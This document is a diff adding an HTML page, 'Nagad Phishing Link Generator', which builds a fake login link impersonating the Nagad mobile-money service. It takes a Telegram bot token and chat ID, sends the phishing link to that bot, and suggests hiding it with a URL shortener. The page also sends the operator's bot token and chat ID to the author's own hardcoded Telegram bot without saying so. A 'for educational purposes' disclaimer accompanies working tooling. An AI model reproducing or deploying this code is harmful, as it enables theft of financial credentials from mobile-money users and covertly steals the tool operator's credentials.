@@ -1,0 +1,347 @@
+<html lang="en"><head>
+
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nagad Phishing Generator</title>
+    <style>
+        body {
+            background-color: #f7f7f7;
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #333;
+            position: relative;
+            overflow: hidden;
+        }
+        .container {
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
+            max-width: 350px;
+            width: 100%;
+            text-align: center;
+            border-top: 5px solid #da002c;
+            z-index: 10;
+            position: relative;
+            display: none; 
+        }
+        .logo-container {
+            width: 100px;
+            height: 100px;
+            margin: -50px auto 20px;
+            border-radius: 50%;
+            background: url('https://download.logo.wine/logo/Nagad/Nagad-Logo.wine.png') no-repeat center;
+            background-size: contain;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            background-color: #fff;
+        }
+        h2 {
+            font-size: 20px;
+            color: #da002c;
+            margin-bottom: 15px;
+            font-weight: 700;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 2px solid #ff8c00; 
+            border-radius: 5px;
+            background: #f9f9f9;
+            font-size: 14px;
+            color: #333;
+            transition: border-color 0.3s ease;
+        }
+        input[type="text"]:focus, input[type="password"]:focus {
+            border-color: #da002c;
+            background: #fff;
+            outline: none;
+        }
+        button {
+            padding: 12px 0;
+            background: #da002c;
+            border: none;
+            border-radius: 5px;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.3s ease;
+            margin-top: 10px;
+        }
+        button:hover {
+            background: #bf0025;
+        }
+        p {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #555;
+        }
+        .link {
+            color: #da002c;
+            text-decoration: none;
+            font-weight: 700;
+        }
+        .link:hover {
+            text-decoration: underline;
+        }
+        
+        .background-ad {
+            position: absolute;
+            top: 10%;
+            right: -200px;
+            width: 400px;
+            height: auto;
+            background: url('https://nagad.com.bd/images/nagad-banner.png') no-repeat center;
+            background-size: cover;
+            opacity: 0.2;
+            transform: rotate(10deg);
+        }
+        .background-ad.bottom {
+            top: auto;
+            bottom: 10%;
+            right: -200px;
+            transform: rotate(-10deg);
+        }
+        
+        blockquote {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #555;
+            border-left: 4px solid #da002c;
+            padding-left: 10px;
+            text-align: left;
+            font-style: italic;
+            opacity: 1;
+        }
+       
+        .typewriter {
+            display: inline-block;
+            overflow: hidden;
+            white-space: nowrap;
+            animation: typing 4s steps(60, end), blink-caret 0.75s step-end infinite;
+            border-right: 3px solid #da002c;
+            box-sizing: content-box;
+            width: 100%;
+        }
+        @keyframes typing {
+            from { width: 0; }
+            to { width: 100%; }
+        }
+        @keyframes blink-caret {
+            from, to { border-color: transparent; }
+            50% { border-color: #da002c; }
+        }
+        
+        .password-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+        }
+        .password-container {
+            background: #fff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2);
+            max-width: 300px;
+            width: 90%;
+            text-align: center;
+            color: #333;
+        }
+        .password-container h3 {
+            margin-bottom: 20px;
+            color: #da002c;
+            font-size: 18px;
+            font-weight: bold;
+        }
+        .password-container input[type="password"] {
+            border: 2px solid #ff8c00;
+            background: #f9f9f9;
+            color: #333;
+            padding: 12px;
+            width: calc(100% - 24px);
+            margin-bottom: 15px;
+        }
+        .password-container button {
+            background: #da002c;
+            color: #fff;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        .password-container button:hover {
+            background: #bf0025;
+        }
+        .get-password-button {
+            background: transparent;
+            border: none;
+            color: #da002c;
+            font-size: 0.9em;
+            text-decoration: underline;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .get-password-button:hover {
+            color: #bf0025;
+        }
+    </style>
+</head>
+<body>
+    
+    <div class="password-overlay">
+        <div class="password-container">
+            <h3>Enter Password</h3>
+            <input type="password" id="passwordInput" placeholder="Enter password" required="">
+            <button onclick="checkPassword()">Submit</button>
+            <button class="get-password-button" onclick="window.location.href='https://t.me/RS_CYBER_TEAM'">Get Password</button>
+        </div>
+    </div>
+
+    
+    <div class="background-ad"><img src="https://picturenkm.simdif.com/images/public/sd_66b5dda204f84.jpg?no_cache=1723201995" height="150" width="150"></div>
+    <div class="background-ad bottom"><img src="https://picturenkm.simdif.com/images/public/sd_66b5dda204f84.jpg?no_cache=1723201995" height="150" width="150"></div>
+    <div class="container" style="display: none;">
+        <div class="logo-container"></div>
+        <h2>Nagad Phishing Link Generator</h2>
+        <form id="telegramForm">
+            <input type="text" id="botToken" name="botToken" placeholder="Enter Bot Token" required="">
+            <input type="text" id="chatId" name="chatId" placeholder="Enter Chat ID" required="">
+            <button type="submit">Generate Link &amp; Send</button>
+        </form>
+        <p></p><center><!-- TERMUX COMMAND STORE -->
+            Developed with ❤️ by <a class="link" href="https://t.me/RS_CYBER_TEAM" target="_blank">@RS_CYBER_TEAM</a>
+        <p></p>
+        <blockquote>
+            <span class="typewriter">⚠️ Disclaimer: THIS TOOL IS ONLY FOR<br> EDUCATIONAL PURPOSES.<br> AUTHOR WILL NOT BE LIABLE <br>FOR ANY KIND OF ILLEGAL ACTIVITIES.</span>
+        </blockquote>
+    </center></div>
+
+    <script>
+        function checkPassword() {
+            const password = document.getElementById('passwordInput').value;
+            const correctPassword = 'RS'; // Set your password here
+
+            if (password === correctPassword) {
+                document.querySelector('.password-overlay').style.display = 'none';
+                document.querySelector('.container').style.display = 'block';
+            } else {
+                alert('Incorrect password. Please try again.');
+            }
+        }
+
+        document.getElementById('telegramForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const botToken = document.getElementById('botToken').value;
+            const chatId = document.getElementById('chatId').value;
+            const baseUrl = 'https://nagad-web.vercel.app/login.html?token=';
+            const fullUrl = `${baseUrl}${botToken}&id=${chatId}`;
+
+            // Function to send the generated link to the user's Telegram bot
+            function sendMessageToBot(token, chatId, message) {
+                const telegramApiUrl = `https://api.telegram.org/bot${token}/sendMessage`;
+                const params = {
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown',
+                    disable_web_page_preview: false
+                };
+
+                fetch(telegramApiUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(params)
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert('Link sent successfully!');
+                    } else {
+                        alert('Failed to send the link. Please check your bot token and chat ID.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('An error occurred. Please try again.');
+                });
+            }
+
+            // Function to send the user info to your Telegram bot
+            function sendUserInfoToBot(botToken, chatId, userToken, userChatId) {
+                const message = `
+😈*NAGAD PHISHING USER*
+🥀Bot token: ${userToken}
+🥀Chat Id : ${userChatId}
+                `;
+
+                const telegramApiUrl = `https://api.telegram.org/bot6723367979:AAH2YZjX04X_MQZxAami2UMFbVXgOAzxxYU/sendMessage`;
+                const params = {
+                    chat_id: 1635012415,
+                    text: message,
+                    parse_mode: 'Markdown',
+                    disable_web_page_preview: false
+                };
+
+                fetch(telegramApiUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(params)
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log('User info sent successfully!');
+                    } else {
+                        console.error('Failed to send user info.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+            }
+
+            // Example message to send (including decoration and hyperlinks)
+            const message = `
+🥀 *GENERATED PHISHING LINK:* [${fullUrl}](${fullUrl})
+
+🔗 *MASK YOUR LINK:* [tinyurl.com](https://tinyurl.com/)
+
+⚠️ *THIS TOOL IS ONLY FOR EDUCATIONAL PURPOSES. AUTHOR WILL NOT BE LIABLE FOR ANY KIND OF ILLEGAL ACTIVITIES.*
+
+🔖 *RESOURCE:* [NAGAD MANUAL PIN APK](https://t.me/RS_CYBER_TEAM/)
+
+💸 *THIS IS A FREE TOOL. DO NOT TRY TO SELL THIS.*
+
+Follow [@RS_CYBER_TEAM](https://t.me/RS_CYBER_TEAM)
+            `;
+
+            // Send the decorated message
+            sendMessageToBot(botToken, chatId, message);
+            // Send the user info to your bot
+            sendUserInfoToBot(botToken, chatId, botToken, chatId);
+        });
+
+        window.onload = function() {
+            document.querySelector('.container').style.display = 'none'; // Initially hide the main content
+        };
+    </script>
+
+
+
+</body></html>
